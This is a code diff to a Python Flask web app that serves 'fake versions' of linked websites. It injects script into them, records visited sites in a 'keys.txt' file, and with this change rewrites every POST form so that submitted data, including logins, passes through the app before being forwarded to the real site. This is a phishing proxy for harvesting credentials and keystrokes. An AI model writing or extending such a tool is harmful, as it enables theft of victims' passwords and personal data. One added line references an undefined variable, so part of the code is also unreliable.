@@ -140,8 +140,6 @@ def tempfunc():
 #generates fake versions on link click
 @app.route("/link", methods=['GET', 'POST'])
 def link():
-	a = make_response("a")
-	print(a)
 	url = request.args.get("url")
 	if h in url or ipb in url or "127.0.0.1" in url or "localhost" in url or "192.168." in url or "0.0.0.0" in url:
 		url="https://en.wikipedia.org/wiki/Idiot"
@@ -159,9 +157,31 @@ def link():
 	elif request.method == 'POST':
 
 		if not "original_url" in request.form:
-			return redirect()
+			return redirect(f"/link?url={url}")
+
+		action = request.form['original_url']
+
+		#Parse the action to send the data to the right url.
+
+		#Add a slash at the end of the url to make it easier to parse.
+		if url[-1] != "/":
+				url += "/"
+
+		#Remove the uri from the url
+		base_url = "//".join(url.split("/")[:3])
+		
+		if action.startswith("/"):
+			post_url = base_url + action
+
+		elif action.startswith("http"):
+			post_url = action
+		else:
+			base_url += "/"
+			post_url += baseurl + action
+			
+
 		data = request.form
-		r = requests.post(url, headers=headers, data=data)
+		r = requests.post(post_url, headers=headers, data=data)
 	else:
 		return "Method not allowed"
 
@@ -199,8 +219,33 @@ def link():
 	if not "<base" in jsadd:
 		jsadd = jsadd.replace("<head>",f"<head><base href='{url}'>")
 
-
 	scrpt.close()
+
+	#Parse the html for post forms.
+	jsadd_soup = BeautifulSoup(jsadd, "html.parser")
+	forms = jsadd_soup.find_all("form", {"method": "POST"}) + jsadd_soup.find_all("form", {"method": "post"})
+	for form in forms:
+		original_form = str(form)
+		#Modify the post form to send the data to the current location.
+		
+
+		original_action = jsadd_soup.new_tag("input")
+		original_action['type'] = 'hidden'
+		original_action['name'] = 'original_url'
+		if "action" in form:
+			original_action['value'] = form['action']
+
+		else:
+			original_action['value'] = url
+		
+		form['action'] = f"/link?url={url}"
+		form.insert(1, original_action)
+
+		#Replace the form
+		jsadd = str(jsadd_soup).replace(original_form, str(form))
+
+
+
 
 	#add the url to our keysfile so we know what site its for
 	with open("keys.txt","a") as keyfile:
